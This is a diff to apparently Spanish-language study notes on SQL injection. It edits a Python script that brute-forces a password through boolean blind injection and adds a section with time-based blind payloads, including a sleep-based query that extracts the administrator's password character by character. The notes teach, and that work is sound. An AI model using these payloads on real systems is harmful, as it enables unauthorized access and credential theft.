@@ -168,11 +168,18 @@ for i in range(0, 20):
             'Te': 'trailers'
         }
         response = requests.get(url, headers=headers)
-        print(f'Trying with {headers}')
         if "Welcome back" in response.text:
             password += j
             print(f"Found character at position {i+1}: {password}")
             break
 
 print(f"Password found: {password}")
+```
+## Blind SQL injection time based
+
+Este es un caso muy silimilar al anterior solo que esta vez el servidor se comporta de la misma forma si una consulta es verdadera o es falsa, por eso es que ahora nos valdremos de las funciones de timepo de los manejadores de SQL.
+
+```sql
+' and sleep(10)-- - # El servidor tardara 10 segundos en darnos respuesta si nuestra condicion es verdadera
+' AND (SELECT SUBSTRING(password,1,1) from users where username='administrator')='a' and sleep(10)-- -
 ```
